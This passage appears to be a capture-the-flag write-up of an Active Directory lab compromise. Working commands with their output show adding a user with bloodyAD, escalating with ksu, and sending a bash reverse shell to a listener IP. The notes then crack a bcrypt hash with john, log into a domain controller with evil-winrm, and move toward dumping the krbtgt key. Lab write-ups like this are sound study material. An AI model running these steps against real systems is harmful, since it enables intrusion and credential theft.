faketime '+7 hours' proxychains4 bloodyAD --host dc02.darkzero.ext \       
  -d DARKZERO.EXT -k add user "root" 'Password123!' \              
  --ou "OU=GiteaMigration,DC=darkzero,DC=ext"
  

---OUTPUT---
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc02.darkzero.ext:389  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DARKZERO.EXT:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc02.darkzero.ext:88  ...  OK
[+] root created
```
![[Pasted image 20260805081617.png]]

- Initilise and export kerberos ccache for user root in svc-runner shell. Then test if it is working

```
kinit root@DARKZERO.EXT -c /tmp/root.ccache
ksu root -c FILE:/tmp/root.ccache << 'EOF'
whoami
id
EOF

---OUTPUT---
Authenticated root@DARKZERO.EXT
Account root: authorization for root@DARKZERO.EXT successful
Changing uid to root (0)
root
uid=0(root) gid=0(root) groups=0(root)
```
![[Pasted image 20260805081639.png]]

- Finally send my payload through this to catch a root shell on my listener:
```
ksu root -c FILE:/tmp/root.ccache << 'EOF'
/bin/bash -i >& /dev/tcp/10.10.17.184/9999 0>&1
EOF

---OUTPUT---
Authenticated root@DARKZERO.EXT
Account root: authorization for root@DARKZERO.EXT successful
Changing uid to root (0)
```
![[Pasted image 20260805081652.png]]

- U grab a shell on my listener:
![[Pasted image 20260805081730.png]]

- I get a better shell
- ```
  python3 -c 'import pty;pty.spawn("/bin/bash")';
  Ctrl+Z
  stty raw -echo; fg
  export TERM=xterm
  ```
  ![[Pasted image 20260805081824.png]]

- In `/root` folder I see an sql file which I read to find some password hashes:
```
cd /root
cat darkzero_campaigns_backup.sql

---RELEVANT-OUTPUT---
--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (1,'admin@dzcampaigns.htb','admin','$2b$10$HDdWzYvp1IWFD9TB4JsuCerlh.vKchv/LmBruCmKGH19hPP7IXvjm',
INSERT INTO `users` VALUES (2,'celia.p@dzcampaigns.htb','celia','$2b$10$2L.IKTOkBtwtWuKcAF/VJ.kUKiBHLQ8hPeg2KYJJXFOUdga2iLsoC
INSERT INTO `users` VALUES (3,'jerry.ap@dzcampaigns.htb','jerry','$2b$10$otSLTatDHIAAp3H58YYaTOgdhMlpbWBTEq1.MWFq5se6OOG3nV2W
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;

```
![[Pasted image 20260805095702.png]]
![[Pasted image 20260805095720.png]]

- I manage to crack the hash of `celia` with john to be `babygurl13`
```
john celia.hash --wordlist=/usr/share/wordlists/rockyou.txt

---OUTPUT---
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 0.00% (ETA: 2026-08-06 16:39) 0g/s 90.00p/s 90.00c/s 90.00C/s mylove..sandra
babygurl13       (?)     
1g 0:00:01:32 DONE (2026-08-05 06:00) 0.01085g/s 127.7p/s 127.7c/s 127.7C/s chesca..000666
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- I attempt to login to DC02 with these credentials and succeed:
```
faketime "+7hours" proxychains4 kinit celia@DARKZERO.EXT
> babygurl13

klist

faketime "+7hours" proxychains4 evil-winrm -i DC02 -u celia -p 'babygurl13'

---OUTPUT-WINRM---
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DC02:5985  ...  OK
*Evil-WinRM* PS C:\Users\celia\Documents> whoami
darkzero-ext\celia
```

![[Pasted image 20260805082231.png]]

- Checking privileges I see celia is Domain Admin:
![[Pasted image 20260805082330.png]]

- Now we can proceed with the SID bypass to gain access to DC01 in the next forest
- I can also dump credentials:
```

```
![[Pasted image 20260805085125.png]]
![[Pasted image 20260805085202.png]]
- I get the krbtgt aes key